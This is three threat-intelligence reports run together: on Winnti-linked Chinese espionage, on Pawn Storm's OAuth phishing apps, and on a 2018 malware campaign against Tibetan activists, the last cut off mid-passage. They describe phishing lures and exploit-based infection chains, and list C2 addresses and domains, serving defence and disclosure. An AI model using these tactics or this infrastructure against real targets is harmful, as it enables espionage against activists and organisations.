value targets. Our primary telemetry consists of months to years of full fidelity network traffic captures. This dataset allowed us to investigate active compromises at multiple organizations and run detections against the historical dataset, allowing us to perform a large amount of external infrastructure analysis.\\nBackground\\nThe Winnti umbrella and closely associated entities has been active since at least 2009, with some reports of possible activity as early as 2007. The term \"umbrella\" is used in this report because current intelligence indicates that the overarching entity consists of multiple teams/actors whose tactics, techniques, and procedures align, and whose infrastructure and operations overlap. We assess that the different stages of associated attacks are operated by separate teams/actors, however in this report we will show that the lines between them are blurred and that they are all associated with the same greater entity. The Winnti and Axiom group names were created by Kaspersky Lab and Symantec, respectively, for their 2013/2014 reports on the original group. The name “Winnti” is now primarily used to refer to a custom backdoor used by groups under the umbrella. Multiple sources of public and private threat intelligence have their own names for individual teams. For example, LEAD is a common alias for the group targeting online gaming, telecom, and high tech organizations. Other aliases for groups related include BARIUM, Wicked Panda, GREF, PassCV, and others. This report details how these groups are linked together and serve a broader attacker mission. The many names associated with actors in the greater intelligence mission are due to the fact that they are built on telemetry of the intelligence provider which is typically unique and dependent on their specific dataset. This report focuses heavily on networking related telemetry.\\nWe assess with high confidence that the attackers discussed here are associated with the Chinese state intelligence apparatus. This assessment is based on attacker TTPs, observed attack infrastructure, and links to previously published intelligence. Their operations against gaming and technology organizations are believed to be economically motivated in nature. However, based on the findings shared in this report we assess with high confidence that the actor’s primary long-term mission is politically focused. It’s important to note that not all publicly reported operations related to Chinese intelligence are tracked or linked to this group of actors. However, TTPs, infrastructure, and tooling show some overlap with other Chinese-speaking threat actors, suggesting that the Chinese intelligence community shares human and technological resources across organizations. We assess with medium to high confidence that the various operations described in this report are the work of individual teams, including contractors external to the Chinese government, with varying levels of expertise, cooperating on a specific agenda.\\nIn 2015 the People’s Liberation Army of China (PLA) began a major reorganization which included the creation of the Strategic Support Force (SSF / PLASSF). SSF is responsible for space, cyber, and electronic warfare missions. Some of the overlap we observed from groups could potentially be related to this reorganization. Notably, key incident details below include attacker mistakes that likely reveal the true location of some attackers as the Xicheng District of Beijing.\\nTactics Techniques and Procedures (TTPs):\\nThough the TTPs of the attacking teams vary depending on the operation, their use of overlapping resources presents a common actor profile. Key interests during attacks often include the theft of code signing certificates, source code, and internal technology documentation. They also may attempt to manipulate virtual economies for financial gain. While unconfirmed, the financial secondary objective may be related to personal interests of the individuals behind the attacks.\\nInitial attack methods include phishing to gain entry into target organization networks. The group then follows with custom malware or publicly available offensive tooling (Metasploit/Cobalt Strike), and may use a number of methods to minimize their risk of being detected. Such techniques include a particular focus on “living off the land” by using a victim\\'s own software products, approved remote access systems, or system administration tools for spreading and maintaining unauthorized access to the network.\\nWe have observed incidents where the attacker used other victim organizations as a proxy for unauthorized remote access. In these cases, organization 1 had been compromised for a long period of time, and the attacker accessed victim organization 2 via the organization 1 network.\\nDelivery and C2 domains routinely have subdomains which resemble target organizations. Additionally, their C2 domains are used across many targets, while subdomains tend to be created and removed quickly and are unique to a particular target or campaign. Also noteworthy is that the actors set their domains to resolve to 127.0.0.1 when not in use, similar to what was originally reported on by Kaspersky Lab (see below).\\nThe actor often uses TLS encryption for varying aspects of C2 and malware delivery. As noted in the “Infrastructure Analysis” section of this report, the actor primarily abuses Let’s Encrypt to sign SSL certificates. We also observed many cases in which self-signed certificates were used in attacks.\\nOverall, the Winnti umbrella and linked groups are lacking when it comes to operational security. However, some activities linked to these groups follow better operational security and infrastructure management approaches. This may be a clue to the division of responsibilities by team and skill level within the broader organization.\\nTargets:\\nThe Winnti umbrella and linked groups’ initial targets are gaming studios and high tech businesses. They primarily seek code signing certificates and software manipulation, with potential financially motivated secondary objectives. These targets have been identified in the United States, Japan, South Korea, and China.\\nBased on the infrastructure, links to previous reporting, and recently observed attacks, the broader organization’s main targets are political. Historically this has included Tibetan and Chinese journalists, Uyghur and Tibetan activists, the government of Thailand, and prominent international technology organizations.\\nOne example of a politically focused lure by the Winnti umbrella and linked groups is an end of 2017 document titled “Resolution 2375 (2017) Strengthening Sanctions on DPR of KOREA” which is a malicious file associated with the C2 infrastructure described here - see MD5: 3b58e122d9e17121416b146daab4db9d.\\nSome Key Public Reports:\\n2013:\\nKaspersky Lab publicly reported on the original Winnti group, technical details around the Winnti samples, and various honeypot analysis methods. Most noteworthy is the Winnti umbrella’s targeting of gaming organizations in search of code signing certificates, virtual currencies, and updating mechanisms which could potentially be used to attack victims’ clients. Interestingly, this was the first identified trojan for the 64-bit Microsoft Windows operating system with a valid digital signature as noted by the author. The abuse of signed applications is a very effective attack approach that the entity continues to use.\\n2014:\\nNovetta released an outstanding report detailing “Operation SMN,” in which they collaborated with a number of private organizations on a large scale malware eradication operation which is linked to the original Winnti group by the malware being delivered. In the report, the actor is named Axiom. Novetta reported links to publications from as far back as 2009 that also link the group to the Chinese state intelligence apparatus with high confidence. Links exist to various known attacks and actor groups, such as “Operation Aurora,” Elderwood Group’s successful 2010 attack against Google and many other organizations. Another link exists to the successful compromise of the security organization Bit9 in 2013, where their own product was used to sign and spread malware to their customers. In addition, FireEye’s “Operation DeputyDog” detailed attacks on Japanese targets from the same attacker infrastructure. Many other incidents are detailed in the Operation SMN report. Following all of these details back in time, we can see an overlap in TTPs and targets from the APT1 report by Mandiant, which serves as a great historical example of Chinese intelligence cyber operations in their most basic form.\\n2016:\\nCylance released a blog post reporting on digitally signed malware used in targeted attacks against gaming organizations in China, Taiwan, South Korea, Europe, Russia, and the United States. Cylance refers to the attacking entity as “PassCV” in their reporting. Cylance successfully identified a large quantity of malware binaries which were signed with valid certificates stolen from a number of gaming studios in East Asia. In addition to detailing the individual certificates and signed malware, they identified a significant amount of network infrastructure which contain various interesting links to our own findings.\\n2017 - March/April:\\nTrend Micro reported on attacks that abused GitHub for use in malware command and control, which they attributed to the original Winnti group. Amusingly, Trend Micro later reported on an individual linked to the group and the attacks who happens to be a fan of pigs.\\n2017 - July 5th:\\nCitizen Lab reported on attacks against journalists by an actor mimicking China-focused news organizations HK01, Epoch Times, Mingjing News, and Bowen Press. As Citizen Lab noted, these news organizations are blocked in China for their political views. The report notes that malware used in these attacks was linked to a stolen code signing certificate mentioned in the Cylance PassCV post. That overlap, in addition to infrastructure links from a Palo Alto Unit 42 blog post, strongly links this attack to the previously mentioned reports as well as to our own. As Unit 42 reports, the attacks against entities in the government of Thailand used the “bookworm” trojan.\\n2017 - July/October:\\nProtectWise 401TRG published our own findings and an update on LEAD using open source and public tooling in attacks against Japanese gaming organizations. These attacks are linked with high confidence to ongoing operations in the United States and East Asia.\\nOther Noteworthy Events:\\nIn 2017, multiple supply-chain attacks occurred which had some similarities to the Winnti umbrella and associated entities. For example, Kaspersky reported on ShadowPad, a large-scale compromise of NetSarang, which resembles the Winnti and PlugX malware. In addition, Kaspersky and Intezer identified notable code similarities to the Winnti umbrella and APT17 in the compromise of Piriform, which allowed attackers to sign and spread altered versions of the CCleaner software to a large customer base.\\nAnalysis of Attacks on Initial Targets\\nThroughout 2017 and 2018, ProtectWise 401TRG was involved in a number of detection and incident response engagements with our customers that linked back to the Winnti umbrella and other closely associated entities. Through the analysis of public and private intelligence, we have successfully identified similar attacks, which allow us to assess with high confidence that the details below follow a global attack trend as the Chinese intelligence operations have evolved over time.\\n2017 Operations:\\nOne of the most common tactics used by the Winnti umbrella and related entities is phishing users whose credentials may provide elevated access to a target network. We have observed spear-phishing campaigns that target human resources and hiring managers, IT staff, and internal information security staff, which are generally very effective.\\nIn 2017 the entity focused most of its efforts around technical job applicant email submissions to software engineering, IT, and recruiting staff, which we originally reported on at our 401trg.com blog. The phishing lures used multiple languages, including Japanese as in the below example:\\nThe approximate translation is as follows:\\nI saw your job posting. My main languages are Object-C, JAVA, and Swift, and I have 7 years experience with Ruby and 6 years experience with PHP. I have 5 years experience developing iOS apps, as well as Android apps, AWS, Jenkins, Microsoft Azure, ZendFramework, and smartphone application payment processing. I also have 5 years experience with MSSQL, Mysql, Oracle, and PostgreSQL. Please see here: [malicious link]\\nThe process that followed a target clicking the malicious link evolved as the attacker progressed through the campaigns. The links consistently sent the victim to a fake resume, but the exact format of that resume changed over time; we have observed resumes being delivered as DOC, XLS, PDF, and HTML files. Once opened, the fake resumes performed various actions in an effort to download malware onto the victim host. During the same time period, we also observed the actor using the Browser Exploitation Framework (BeEF) to compromise victim hosts and download Cobalt Strike. In this campaign, the attackers experimented with publicly available tooling for attack operations. During this infection process, the actor was known to check the target operating system and deliver malware, signed by a previously stolen key, for the appropriate host environment. In some cases, valid Apple certificates stolen from victims were used in this process, which linked the attack to additional victim organizations.\\nPost-compromise actions by the attacker followed a common pattern. First they attempted to spread laterally in the network using stolen credentials and various reconnaissance efforts, such as manually examining shares and local files. The primary goal of these attacks was likely to find code-signing certificates for signing future malware. The secondary goals of the attackers depended on the type of victim organization, but were often financial. For example, gaming organizations tended to fall victim to manipulation or theft of in-game virtual currencies. Non-gaming victims may have experienced theft of intellectual property such as user or technology data.\\n2018 Operations:\\nMore recently, various attack campaigns from the Winnti umbrella and associated groups have been very successful without the use of any exploits or malware. Phishing remains the initial infection vector but the campaign themes have matured. In 2018, the campaigns have largely been focused on common services such as Office 365 and Gmail.\\nIt is important to note that attackers likely have additional information on their target organizations\\' preferred email solutions based on previous incidents or open source intelligence.\\nIn more recent phishing campaigns conducted by the Winnti umbrella and associated groups, URL shortening services have been used. For example, Google’s URL shortening service goo.gl was used over the past weeks, allowing us to gain insight into the scale of this campaign using publicly available analytics.\\nAs you can see from the above screenshot, this particular phishing campaign ran from March 20th to March 28th, 2018. Notably, the link was created on February 23rd, 2018, indicating roughly three weeks of preparation for the attacks. These metrics allow us to gain insight into who clicked the link in a phishing email and was directed to a phishing or malware delivery landing page. According to Google analytics, there were a total of 56 clicks. 29 were from Japan, 15 from the United States, 2 from India, and 1 from Russia. 33 of the clicks were from Google Chrome, and 23 were from Safari. 30 were from Windows OS hosts, and 26 were macOS hosts.\\nIn general, the attackers phish for credentials to a user’s cloud storage, and would be expected to later attempt malware delivery in the cases of a failed credential phish or valueless cloud storage.\\nIn cases where the victim uses O365 and/or G-suite for enterprise file storage, the attackers manually review the contents for data of value. If code signing certificates are stored here, the primary mission has been accomplished, as they may be easily downloaded. In other cases, the attackers attempt to use other files and documentation in the cloud storage to help them traverse or gain privileges on the network. The targets in 2018 include IT staff, and commonly sought out files include internal network documentation and tooling such as corporate remote access software.\\nOnce the attackers gain remote access to the network via malware or stolen remote access tooling and credentials, the operation continues as we’ve seen, though their post-compromise actions have become more efficient and automated. Internal reconnaissance is performed by scanning the internal network for open ports 80, 139, 445, 6379, 8080, 10022, and 30304. The choice of ports by the attacker indicates a strong interest in internal web and file storage services. An interesting addition is the use of 30304, which is the peer discovery port for Ethereum clients.\\nIn the attackers’ ideal situation, all remote access occurs through their own C2 infrastructure, which acts as a proxy and obscures their true location. However, we have observed a few cases of the attackers mistakenly accessing victim machines without a proxy, potentially identifying the true location of the individual running the session. In all of these cases, the net block was 221.216.0.0/13, the China Unicom Beijing Network, Xicheng District.\\nVisualizing Attacker Infrastructure\\nBased on the various incidents we have been involved in, in addition to past public reporting and open-source intelligence, we can construct a map representing the infrastructure most closely associated with the Winnti umbrella and closely related entities. For the sake of producing an accurate representation of the infrastructure, we are excluding any shared infrastructure (such as hosting provider IPs used for many unrelated domains) and low confidence indicators. Please note this is not an exhaustive list of all active infrastructure in use by the group.\\nAs detailed below, this infrastructure spans at least eight years of activity by the Winnti umbrella and related groups. Please note, as this section heavily references the “Some Key Public Reports” section, above, we recommend reading that first. Indicators are provided in Appendix A of PDF (see top of page).\\n1. The area of the map labeled #1 is the phishing, malware delivery, fake resume, and C2 infrastructure. This includes domains, IPs, malware hashes, SSL certificates, and WHOIS information. In this section of the infrastructure, we primarily observe the network and file indicators which would be used against targets valued for code signing certificates, software manipulation, and potential financial manipulation. The indicators detailed in the 2017 & 2018 Initial Target section of this report are located in #1. Infrastructure in this area is currently in use and not entirely historical.\\n2. This area is a network that we assess is associated with the umbrella with low confidence. The most interesting findings here are the large number of Let’s Encrypt SSL certificates in use and the overlap with attacker exclusive infrastructure. This proposed relationship is generated by infrastructure links alone, as no malicious activity has been confirmed to or from region #2. Infrastructure in this area is currently in use and not historical.\\n3. Area #3 is linked to the initial attack infrastructure (#1) by domain WHOIS details, likely from operational security mistakes. We assess with high confidence that these infrastructures are linked. Based on the lax structure and naming of this section, it is highly probable that it is used for attacker experimenting and development. Some examples include domains such as “nobody.will.know.whoami[.]la”, “secret.whoami[.]la”, and “no.ip.detect.if.using.ipv6[.]la”. Infrastructure in this area is currently in use and not historical.\\n4. This area has various links to #3 in which an individual software developer is identified. We asses this connection with low to medium confidence and will refrain from publicly sharing details in this report. This area contains many personally operated domains and SSL certificates. Infrastructure in this area is currently in use and not historical.\\n5. Area #5 of the map is part of what Novetta reported on as Operation SMN in 2014. Infrastructure in this area is purely historical and based on Novetta’s reporting, which we can link to area #1 via known umbrella infrastructure. The vast majority of indicators in this area are the many associated hashes, combined with their C2 destination domains and IPs.\\n6. This area of the map is what Cylance reported on as PassCV in 2016. The vast majority of infrastructure and indicators here are stolen code signing certificates, malware signed with the certificates, and C2 domains. This area contains information on many victims of campaigns related to area #1. Infrastructure in this area is historical. We assess that this area is linked to the Winnti umbrella with high confidence.\\n7. This section represents infrastructure identified by Citizen Lab in their July 5th 2017 reporting on attacks against journalists. As they originally identified, one of the NetWire binaries was signed with a stolen certificate linked to #6, the Cylance PassCV report. We were able to further expand this section by pivoting off of additional domain WHOIS information.\\n8. Lastly is area #8, which links back with high confidence to #7 (Citizen Lab reporting) and #6 (PassCV). This area consists of domains, IPs, MD5 file hashes, and further WHOIS operational security mistakes. This area is similar in functionality to #1 and #3, serving as infrastructure for both high-value politically focused attacks and developer personal use. This section links to the online identities of an individual we asses to be associated with the Winnti umbrella or a closely related group at a medium to high confidence. Infrastructure in this area is currently in use and not historical. One example of malicious activity in this area was the document detailing the strengthening of sanctions against North Korea, above. These activities are similar to the type of politically motivated targeted attacks Citizen Lab reported on. Some infrastructure in this area is currently in use and is not completely historical.\\nInvestigative Findings\\nBased on incident response engagements, research into the associated attacker infrastructure, and previously reported research, we can summarize our findings as follows:\\n1. The Chinese intelligence apparatus has been reported on under many names, including Winnti, PassCV, APT17, Axiom, LEAD, BARIUM, Wicked Panda, and GREF.\\n2. The overlap of TTPs and infrastructure between the Winnti umbrella and other groups indicates the use of shared human and technology resources working towards an overarching goal. Operational security mistakes allow the linking of attacks on lower value targets to higher value campaigns. Reuse of older attack infrastructure, links to personal networks, and observed TTPs play a role in this overlap.\\n3. The attackers behind observed activity in 2018 operate from the Xicheng District of Beijing via the net block 221.216.0.0/13.\\n4. Initial attack targets are commonly software organizations in the United States, Japan, South Korea, and China. Later stage high profile targets tend to be political organizations or high-value technology companies.\\n5. The attackers grow and learn to evade detection when possible, but lack operational security when it comes to the reuse of some tooling. Living off the land and adaptability to individual target networks allow them to operate with high rates of success.\\nConclusion\\nWe hope the information we’ve shared in this report will help potential targets and known victims in addition to the greater information security community. Though they have at times been sloppy, the Winnti umbrella and its associated entities remain an advanced and potent threat. We hope that the information contained within this report will help defenders thwart this group in the future.\\nWe’d like to extend a special thank you to all the victims, targets, researchers, and security vendors who have shared their own findings over the years.\\nIndicators\\nIndicators can be found\\nin the PDF version of this report and our GitHub Detection IOC repository.

The group uses different methods and strategies to gain information from their targets, which are covered in our latest research. However, they are particularly known for dangerous credential phishing campaigns. In 2016, the group set up aggressive credential phishing attacks against the Democratic National Convention (DNC), German political party Christian Democratic Union (CDU), the parliament and government of Turkey, the parliament of Montenegro, the World Anti-Doping Agency (WADA), Al Jazeera, and many other organizations.\\nThis blog post discusses how Pawn Storm abused Open Authentication (OAuth) in advanced social engineering schemes. High profile users of free webmail were targeted by campaigns between 2015 and 2016.\\nHow is OAuth abused?\\nOAuth is a way of authorizing third party applications to login to users’ online accounts for social media sites, gaming sites, and services like free webmail. The big advantage is that users don’t have to reveal their password; instead, the third party applications get a token that can be used for authentication.\\nWhile OAuth offers convenience and can be usefully applied in different ways, it may also expose the user to risks. Threat actors can get through the background checks that service providers do before authorizing applications for OAuth use. These actors can then integrate OAuth into advanced social engineering schemes. Some internet service providers only require an email address and a website for third party applications to use OAuth. Because of these policies, experienced actor groups like Pawn Storm can take advantage of OAuth for their credential phishing schemes.\\nFigure 1. The sequence of Pawn Storm’s OAuth abuse\\nA dissection of Pawn Storm OAuth attacks\\nIn these attacks a user would get a message like this:\\nFigure 2. A phony email from Pawn Storm\\nThe email poses as an advisory from Gmail and prompts potential victims to install an “official” application called “Google Defender”. Normally an internet user will know better than to readily install an application that wasn’t asked for.\\nIf the user clicks on the link, it will lead to a page on accounts.google.com that looks like this:\\nFigure 3. A request to grant access from “Google Defender”\\nAt this point, the user is faced with a legitimate Google site—since all OAuth approvals are done on the site of the service provider—but the application itself is part of a phishing scheme.\\n“Google Defender” is actually a third party application made by Pawn Storm. After abusing the screening process for OAuth approvals, Pawn Storm’s rogue application operates like every other app accepted by the service provider. If the user falls for the scam and clicks the “Allow” button, an OAuth token is provided to the app, giving Pawn Storm semi-permanent access to the target’s mailbox.\\nApart from targeting Gmail users, Pawn Storm has also abused OAuth in credential phishing attacks against high profile Yahoo users. Here is an example from 2015 where “McAfee Email Protection” is offered.\\nFigure 4. A convincing Yahoo phishing email\\nClicking on the “Try McAfee Email Protection” button would lead to this legitimate website:\\nFigure 5. This gives the third party app OAuth access\\nHowever the application is not a service of Yahoo or a legitimate product of McAfee, but a rogue application used by Pawn Storm. Clicking on the “Agree” button would give Pawn Storm an OAuth token and access to the targets’ mailbox. The group then gains access to the mailbox until the token gets revoked by the service provider or the target.\\nPawn Storm apparently had some success with this type of attack as it kept sending this kind of social lure during the end of November and the first half of December 2015, as indicated in the next figure.\\nFigure 6. Overview of Pawn Storm’s Yahoo credential phishing campaigns. The blue boxes indicate when Pawn Storm used OAuth lures while red boxes indicate other phishing email strategies\\nOAuth enhances the user experience on the web. For example, by allowing social networks access to your webmail contact list, it is easier to find friends who are subscribed to the same social network. But while we believe that internet service providers have enhanced security checks of applications that are allowed to use OAuth, internet users are urged to never accept OAuth token requests from an unknown party or a service they did not ask for. Regularly review the applications you have granted access to your mailbox in the security settings of your free webmail or social media service. In case you see a suspicious application immediately revoke the OAuth token.\\nThese are known rogue applications of Pawn Storm that have been used in credential phishing attacks against high profile users (variants of these names are likely to have been used by Pawn Storm as well):\\nGoogle Defender\\nGoogle Email Protection\\nGoogle Scanner\\nDelivery Service (Yahoo)\\nMcAfee Email protection (Yahoo)\\nFor more information about Pawn Storm, check out Espionage and Cyber Propaganda: A Look into Pawn Storm’s Activities over the Past Two Years.\\nLearn how to protect Enterprises, Small Businesses, and Home Users from ransomware:ENTERPRISE »SMALL BUSINESS»HOME»\\nTags: OAuthPawn Storm\\nSecurity Predictions for 2020\\nCybersecurity in 2020 will be viewed through many lenses — from differing attacker motivations and cybercriminal arsenal to technological developments and global threat intelligence — only so defenders can keep up with the broad range of threats.\\nRead our security predictions for 2020.\\nBusiness Process Compromise\\nAttackers are starting to invest in long-term operations that target specific processes enterprises rely on.

The strength and meaning of these connections is assessed.\\nWe examine the challenges associated with investigating closed espionage ecosystems and the importance of accurately describing the players and the harms they cause.\\nIntroduction\\nIn January 2018, a Tibetan activist received a mundane-looking email purporting to be program updates from a human rights NGO. Attached to the message were a PowerPoint presentation and a document. The activist, like many in the Tibetan diaspora, had grown wary of unsolicited emails with attachments, and instead of opening the documents, shared the files with Citizen Lab researchers.\\nThe suspicion was warranted: the attachments were malicious. If clicked, the files would run recent exploits to infect Windows computers with custom malware. This email was the start of a malware campaign active between January to March 2018 that targeted Tibetan activists, journalists, members of the Tibetan Parliament in exile, and the Central Tibetan Administration. We worked closely with the targeted groups to collect the malicious messages, and also engaged in incident response with a compromised organization. This collaboration enabled us to gain further insights into the tactics, techniques, and procedures used by the operators.\\nThe campaign used social engineering to trick targets into opening exploit-laden PowerPoint (CVE-2017-0199) and Microsoft Rich Text Format (RTF) documents (CVE-2017-11882) attached to e-mail messages. The malware includes a PowerShell payload we call DMShell++, a backdoor known as TSSL, and a post-compromise tool we call DSNGInstaller.\\nWe call this recent campaign the “Resurfaced Campaign” because of connections to a 2016 campaign that targeted Tibetan Parliamentarians (which we refer to as the “Parliamentary Campaign”). These connections suggest that the same group may be involved or tools and infrastructure are being shared between multiple groups.\\nTibetan Diaspora: A Highly Targeted Community\\nThe threat of digital espionage has become a persistent reality for the Tibetan diaspora, which has been targeted by malware campaigns for over a decade. Historically, these operations have relied heavily on malicious attachments that leverage known exploits and basic Remote Access Trojans (RATs). This tactic may reflect a basic risk-reward calculation when targeting under-resourced civil society groups: if they are using unpatched systems, why run the risk of exposing more sophisticated technical tools when simple ones will do? The operators instead appear to focus much of their innovation on clever social engineering paired with a “just enough” approach to tooling. The limited technical innovation that we observe may be driven by the pragmatic need to continue to achieve access and permanence, rather than more sophisticated goals such as obscuring malware authorship or resisting decompiling.\\nShifting Tactics?\\nSince 2016, the number of reported targeted malware campaigns against Tibetan groups has dropped significantly. In place of targeted malware, we have observed a shift to phishing designed to harvest credentials from online accounts. A notable exception to this change is the Parliamentary Campaign, which used known and patched exploits to deliver custom malware called KeyBoy. The Resurfaced Campaign is the first targeted malware activity against the Tibetan community we have observed since the Parliamentary Campaign.\\nFamiliar Connections\\nThe Resurfaced Campaign used different exploits and payloads than the Parliamentary Campaign but shares other connections. The two campaigns used similar spear phishing messages and both targeted Tibetan parliamentarians. One of the e-mail addresses used to send spear phishing messages in the Resurfaced Campaign (tibetanparliarnent[@]yahoo.com) was also used repeatedly during the Parliamentary Campaign.\\nBased on the use of common tools and code similarities, both campaigns are also connected to a wider operation called “Tropic Trooper” that has been active since at least 2012 and was first reported by Trend Micro in 2015. Tropic Trooper has targeted governments and companies in Taiwan and the Philippines and is usually identified through the use of specific malware including Yahaoyah, Yahamam, and TSSL. The Resurfaced Campaign is linked to Tropic Trooper through its use of TSSL. The Parliamentary Campaign is linked through code similarities between Keyboy and Yahaoyah. Trend Micro noted Yahoyah shared the same algorithm for encoding configuration files as versions of KeyBoy found in 2013.\\nIf the same threat actor is behind the Resurfaced and Parliamentary Campaigns, the operators appear to have engaged in limited and incremental changes to their tools. Nevertheless, these improvements are minor, and are unlikely to represent significant costs. The exploit code and PowerShell code used in the campaign were publicly available. Proofs of concept of the exploits exist on Github, and DMShell++ (the PowerShell payload) is based on example code posted online.\\nClosed Espionage Ecosystems: An analytical challenge\\nThese types of campaigns use custom built malware that originate from a closed espionage ecosystem in which the parties involved (e.g., developers who write the malware, operators who conduct the campaigns, and intelligence customers who incentivize the activity) are difficult to identify and fully segment. Intelligence customers may be actively managing the development of tools and selection of targets or may be passive consumers who the operators know are interested in and will pay for information from certain targets. The cost and effort put into closed espionage ecosystems is harder to quantify than commoditized malware kits (such as cybercrime tools repurposed for espionage) or government exclusive malware (such as products from NSO Group) which have defined prices and markets.\\n“Actors” in closed espionage ecosystems are abstractions typically identified by the use of common tools and infrastructure. This level of attribution can help cluster incidents together into recognizable patterns and indicators. However, many burglars can, at different times, use the same crowbar. For example, seemingly disparate campaigns and threat actors may be linked through what FireEye describes as a “digital quartermaster”, which refers to a resource of malware development and infrastructure that is shared amongst multiple campaigns and groups. Knowing what tools and tactics are leveraged in malware campaigns can provide insight into technical capabilities and allow an analyst to track activities over time, but this knowledge alone does not explain how information collected by the operators is ultimately used by the intelligence customer nor the types of harm that can follow for civil society.\\nThis report is organized into the following sections:\\nPart 1: Resurfaced Campaign describes the Resurfaced Campaign that targeted Tibetan groups between January and March 2018.\\nPart 2: Investigating a Compromise describes a compromise of a Tibetan NGO and analyzes operator actions post-infection.\\nPart 3: Familiar Connections highlights connections between the Parliamentary and Resurfaced Campaigns to an operation called “Tropic Trooper”.\\nPart 4: Closed Espionage Ecosystems and Identifying Harm discusses challenges in analyzing closed espionage ecosystems and situates our investigation within wider trends of digital espionage operations against the Tibetan diaspora.\\nPart 1: Resurfaced Campaign\\nThis section describes the Resurfaced Campaign that targeted Tibetan groups between January and March 2018.\\nCampaign Overview\\nWe observed the Resurfaced Campaign from January 16 to March 2, 2018 and collected seven spear phishing emails sent to Tibetan activists, journalists, members of the Tibetan Parliament in exile, and the Central Tibetan Administration (CTA).\\nThe messages were sent from email addresses that mimicked staff of Tibetan NGOs or the CTA, and shared content on advocacy activities, cultural events, and administrative announcements. We verified that some of this information was publicly available on social media, whereas other information may have been collected from public correspondence or private messages that could have been previously stolen by the operators. A January 22 spear phishing email was sent from tibetanparliarnent[@]yahoo.com, which was also used to send multiple spear phishing emails in the Parliamentary Campaign (see Figure 1).\\nFigure 1: Spear phishing email sent on January 22 2018 that reuses an email address that was used in the 2016 Parliamentary Campaign.\\nWhile both the Parliamentary Campaign and the Resurfaced Campaign used similar social engineering tactics and a common email address to send spear phishing messages, the Resurfaced campaign used a different, newer malware toolkit. In six of the eight intrusion attempts, the operator sent a Microsoft PowerPoint file exploiting a vulnerability disclosed in 2017 (CVE-2017-0199) designed to drop a payload written in Microsoft’s PowerShell scripting language from a remote server. In two early intrusions attempts in January 2018, the operator also used an exploit for RTF documents (CVE-2017-11882).\\nFigure 2 provides a timeline of the Resurfaced Campaign highlighting when spear phishing emails were sent and the exploits that were used.\\nFigure 2: Timeline of spear phishing emails sent in the Resurfaced Campaign.\\nInfection Chain: CVE-2017-0199 and DMShell++\\nThe most common infection chain in the campaign was the use of a PowerPoint Open XML Slide Show file (PPSX) exploiting CVE-2017-0199 to load a remote payload we call DMShell++, a basic TCP reverse shell written in Microsoft’s PowerShell scripting language. We observed a very similar, albeit more simple, implementation of DMShell++ on a public posting on Wooyun (a Chinese hacker forum1) by an author with the username “DM_”. We refer to the version discovered in our investigation as “DMShell++” in reference to the Wooyun username combined with the fact that the Wooyun version has been incrementally updated with additional basic commands.\\nWe observed versions of DMShell++ hosted on the domains enumerated in Table 1. However, we did not monitor these domains continuously and therefore it is possible that the operator may have used additional configurations not listed in the table.\\nDate Observed\\nSource\\nC2 Configuration\\nJanuary 18, 2018\\ncommail[.]co:5453/qqqzqa\\n27.126.186.222:6001\\n27.126.186.222:6002\\n27.126.186.222:6003\\nJanuary 22, 2018\\ntibetnews[.]info:8026/qqqzqa\\n103.55.24.196:80\\n103.55.24.196:443\\n45.127.97.222:443\\nFebruary 2, 2018\\ncommail[.]co:5453/qqqzqa\\n27.126.186.222:80\\n27.126.186.222:443\\n27.126.186.222:8080\\nMarch 6, 2018\\ncomemails[.]email:1234/hgf\\n203.189.232.207:80\\n203.189.232.207:443\\n103.55.24.196:443\\nTable 1: List of C2 configurations observed in different DMShell++ samples\\nThe versions of DMShell++ we observed had the same capabilities but different configurations for command and control. Table 2 provides an overview of capabilities of DMShell++ and how it could be used by an operator (technical details are included in Appendix A). This basic script gives the remote actor vast control over the victim computer. Initially deploying generic payloads hides true capabilities and intentions from defenders should the attempted intrusion be detected at this stage.\\nCapability\\nPurpose to the Operator\\nCollect system information\\nInternal IP address\\nOperating system (OS) version\\nUser name\\nCollecting system information helps the operator assess if they have the correct target and learn about potential weaknesses in the computer’s OS.\\nExecute remote commands\\nExecuting remote commands provides additional reconnaissance information that can help the operator determine their next steps.\\nSend additional files\\nThe ability to send additional files means the operator can download additional tools with different capabilities.\\nExtract data\\nStealing files from the target machine is likely the operator’s ultimate goal.\\nTable 2: Overview of DMShell++ capabilities\\nInfection Chain: CVE-2017-11882 and DMShell++\\nIn two spear phishing emails sent early in the campaign, the operator used a second exploit document in addition to the PPSX files described previously to deploy DMShell++. It is unclear why the operator used this secondary method. However, given the amount of time between patches being released for both vulnerabilities, as well as the different methods being used to execute the PowerShell payload, it is possible the operator wanted to maximize success while testing both exploitation methods.\\nThe second document was a RTF document designed to exploit CVE-2017-11882. In this case, instead of loading the PowerShell script from a remote location, this exploit document followed a more traditional infection chain by attempting to write an executable (EXE) program to the target computer. The EXE program was designed to create a small PowerShell script on the target computer to decode and execute an encoded version of DMShell++. This version of DMShell++ was configured to use the same C2 infrastructure as the remote version downloaded by the PPSX file sent in the same spear phishing email (27.126.186[.]222 on ports 6001, 6002, and 6003; Appendix D provides a detailed overview of the server infrastructure). Figure 3 shows an overview of the CVE 2017-11822 and DMShell++ infection chain.\\nFigure 3: CVE-2017-11882 and DMShell++ Infection Chain.\\nInfection Chain: CVE-2017-11882 and TSSL Suite\\nIn the spear phishing email sent on January 23 2018, the operator also included a RTF document designed to exploit CVE-2017-11882 and execute a payload embedded in the file. However, in this instance, the operator deployed an entirely different set of tools.\\nAs we analyzed the files written to disk as part of this infection chain, we observed multiple program database (PDB) strings. When available, PDB strings can be indicative of the malware creator’s environment and namings for the developed malware.\\nD:\\\\Work\\\\Project\\\\VS\\\\house\\\\Apple\\\\Apple_20180115\\\\Release\\\\InstallClient.pdbD:\\\\Work\\\\Project\\\\VS\\\\house\\\\Apple\\\\Apple_20180115\\\\Release\\\\FakeRun.pdb\\nThese PDB strings are consistent with a set of tools known as TSSL, which were previously described by Trend Micro and PwC and linked to KeyBoy and Tropic Trooper campaigns. The TSSL suite analysed in these reports includes a loader called FakeRun and a backdoor named TClient. While the samples we analyzed have a few differences from previously reported instances (e.g., version numbers, storage of configuration data, method for launching payloads) we conclude that they are likely based on the same source code (see Appendix B for a detailed comparative analysis of the samples). Figure 4 shows an overview of the CVE 2017-11882 and TSSL suite infection chain.\\nFigure 4: CVE-2017-11882 and TSSL Suite Infection Chain.\\nPart 2: Investigating a Compromise\\nThis section describes a compromise of a Tibetan NGO and analyzes operator actions post-infection.\\nThe fourth spear phishing email of the campaign was sent on January 23, 2018 to a range of targets working for Tibetan NGOs, media groups, and the CTA. The message appeared to be sent from the Director of the Tibet Museum, which is an official museum of the CTA. Attached to the email were RTF and PPSX messages that claimed to present information about the National Museum 